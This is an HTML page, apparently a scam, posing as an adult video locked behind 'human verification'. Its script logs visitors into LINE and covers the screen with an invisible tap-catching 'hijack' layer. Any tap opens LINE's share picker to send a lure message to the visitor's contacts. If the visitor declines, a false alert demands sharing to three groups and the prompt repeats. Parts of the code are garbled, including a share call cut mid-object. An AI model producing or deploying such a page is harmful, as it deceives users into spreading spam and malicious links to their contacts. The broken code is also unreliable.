<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>影片驗證中...</title>
    <script src="https://static.line-scdn.net"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, sans-serif; }
        .video-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://syu126147.github.io/hdvideo/') center/cover no-repeat; filter: brightness(0.4) blur(4px); z-index: 1; }
        .player-box { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #fff; text-align: center; padding: 0 30px; }
        .play-btn { width: 95px; height: 95px; background: rgba(255, 0, 0, 0.95); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 4px solid #fff; margin-bottom: 30px; box-shadow: 0 0 40px rgba(255, 0, 0, 0.7); }
        .play-btn::after { content: ''; border-style: solid; border-width: 18px 0 18px 30px; border-color: transparent transparent transparent #fff; margin-left: 10px; }
        #hijack-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: transparent; -webkit-tap-highlight-color: transparent; }
        .msg { font-size: 20px; font-weight: bold; line-height: 1.6; text-shadow: 0 2px 10px #000; }
        .sub-msg { font-size: 14px; color: #bbb; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="video-bg"></div>
    <div class="player-box">
        <div class="play-btn"></div>
        <div class="msg">⚠️ 內容包含 18+ 成人資訊<br>請點擊播放鍵完成「真人驗證」</div>
        <div class="sub-msg">(驗證成功後將自動解鎖並開始播放)</div>
    </div>
    <div id="hijack-layer" onclick="forceHijack()"></div>

    <script>
        const LIFF_ID = "2009200124-rSJ8f72Y";
        const SUCCESS_URL = "https://18avideo.com/VKUFu"; 

        async function init() {
            try {
                await liff.init({ liffId: LIFF_ID });
                if (!liff.isLoggedIn()) { liff.login(); }
            } catch (err) { console.error(err); }
        }

        async function forceHijack() {
            const res = await liff.shareTargetPicker(
                        },
                        "footer": {
                            "type": "box", "layout": "vertical", "contents": [
                                { "type": "button", "action": { "type": "uri", "label": "▶ 立即觀看", "uri": "https://liff.line.me" + LIFF_ID }, "style": "primary", "color": "#ff0000" }
                            ]
                        }
                    }
                }
            ], { isMultiple: true });

            if (res) {
                window.location.replace(SUCCESS_URL);
            } else {
                alert("❌ 驗證失敗！偵測到未完成分享，請發送至 3 個群組以完成驗證。");
                forceHijack(); 
            }
        }
        window.onload = init;
    </script>
</body>
</html>